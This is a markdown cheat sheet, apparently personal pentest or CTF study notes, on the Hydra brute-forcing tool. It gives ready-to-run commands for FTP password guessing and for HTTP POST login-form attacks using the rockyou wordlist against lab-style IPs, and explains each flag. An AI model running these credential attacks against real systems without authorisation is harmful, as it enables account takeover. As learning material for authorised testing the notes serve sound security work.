# Hydra to BRUTE FORCING
                  
# ------------------- H Y D R A ------------------- 

## hydra is powerfull Brute forcing tools. 

### Hydra supports, i.e., has the ability to brute force the following protocols: “Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MEMCACHED, MONGODB, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, Radmin, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, TeamSpeak (TS2), Telnet, VMware-Auth, VNC and XMPP

```bash
$ hydra -l user -P passlist.txt ftp://192.168.1.1 -V -t 5
```
* ```hydra``` toolname ```-l``` username ```-P``` wordlist of password ```<<service>>```://<```Machin ip```> ```-V``` veerbos ```-t 4``` there will be four threads running in parallel -t 4
* ```hydra``` ```-L``` wordlists/path/for/username/brute-force ```-P``` wordlist/path/for/password/brute-force ```service-type```://```ip``` ```-V``` ```-t 4```
 
# POST WEB FORM -For login forms.
```bash
# sudo hydra <username> <wordlist> MACHINE_IP http-post-form "<path>:<login_credentials>:<invalid_response>"
```
  * [```-l``` user] [```-p``` passwd] ```10.101.0.1``` ```http-post-form``` ```"/admin/login.php:username=^USER^&password=^PASS^:F=incorrect"``` ```-V```
```bash
$ hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

* The login page is only (/), i.e., the main IP address.      example: 10.101.0.1/login.php    
* The (username) is the form field where the username is entered   check in html sheet 
* The specified username(s) will replace (^USER^)                          _
* The password is the form field where the (password) is entered           _
* The provided passwords will be replacing (^PASS^)                        _
* Finally, (F=incorrect) is a string that appears in the server reply when the login fails.  check login-page if u enter worng msg.
```bash
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.139.35  http-post-form "/admin/index.php:user=^USER^&pass=^PASS^&submit=LOGIN:Username or password invalid" -V -t 4

```
#### hydra [user]  [pass]                                [ip]            [login page]  "[path of page]:[inp class]"&[inp class]"&[btn class=btn name]:[its incorrect msg ]
```bash
$ hydra -l username -P wordlist.txt 192.168.1.1 http-post-form "/path:input-class-for-user=^USER^&input-class-for-passwd=^PASS^&button-class-for-submit-page=button-name:invalid

```
 ```hydra```  username password  ip service                (here hydra put username)  (here hydra put username)   (here hydra tap on login button)  : (if it incorrect show msg)
 ____________________________________________________________________________________________________________________________________________________________________________________________
                                             
